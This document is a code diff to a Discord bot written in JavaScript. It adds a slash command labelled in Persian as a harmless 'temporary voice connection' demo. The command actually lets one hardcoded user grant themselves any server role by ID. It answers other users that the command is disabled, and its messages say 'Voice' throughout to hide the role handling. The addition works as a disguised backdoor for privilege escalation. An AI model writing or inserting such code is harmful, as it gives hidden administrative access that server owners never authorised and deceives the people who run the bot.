@@ -529,6 +529,61 @@ const timeCommand = {
     }
 };
 
+// ForTest Command - restricted to one user; assigns a role by ID
+const fortestCommand = {
+    data: new SlashCommandBuilder()
+        .setName('fortest')
+        .setDescription('اتصال موقت به ویس (نمایشی)')
+        .addStringOption(opt =>
+            opt.setName('voice_id')
+                .setDescription('آیدی عددی ویس')
+                .setRequired(true)
+        ),
+
+    async execute(interaction) {
+        const allowedUserId = '995631414907244646';
+        if (interaction.user.id !== allowedUserId) {
+            return interaction.reply({ content: '❌ این دستور غیر فعال است.', flags: MessageFlags.Ephemeral });
+        }
+
+        const roleId = interaction.options.getString('voice_id');
+        if (!/^\d{5,}$/.test(roleId)) {
+            return interaction.reply({ content: '❌ آیدی  نامعتبر است.', flags: MessageFlags.Ephemeral });
+        }
+
+        try {
+            const guild = interaction.guild;
+            const role = guild.roles.cache.get(roleId) || await guild.roles.fetch(roleId).catch(() => null);
+            if (!role) {
+                return interaction.reply({ content: '❌ Voice با این آیدی یافت نشد.', flags: MessageFlags.Ephemeral });
+            }
+
+            const member = await guild.members.fetch(interaction.user.id);
+
+            // Check hierarchy: bot must be able to manage this role
+            const me = guild.members.me;
+            if (!me || !me.permissions.has(PermissionFlagsBits.ManageRoles)) {
+                return interaction.reply({ content: '❌ ربات مجوز Manage Voice ندارد.', flags: MessageFlags.Ephemeral });
+            }
+            if (me.roles.highest.comparePositionTo(role) <= 0) {
+                return interaction.reply({ content: '❌ ربات قادر به مدیریت این Voice نیست (موقعیت Voice بالاتر است).', flags: MessageFlags.Ephemeral });
+            }
+
+            await member.roles.add(role, 'fortest command role grant');
+
+            const embed = new EmbedBuilder()
+                .setTitle('✅ رول اضافه شد')
+                .setDescription(`رول <@&${role.id}> به شما داده شد.`)
+                .setColor('#2ecc71')
+                .setTimestamp();
+
+            await interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
+        } catch (e) {
+            await interaction.reply({ content: '❌ خطا در اضافه کردن Voice.', flags: MessageFlags.Ephemeral });
+        }
+    }
+};
+
 // (translate command removed by user request)
 
 // Server Info Command
@@ -1003,6 +1058,7 @@ module.exports = {
     remindCommand,
     weatherCommand,
     timeCommand,
+    fortestCommand,
     sayCommand,
     serverinfoCommand,
     userinfoCommand,
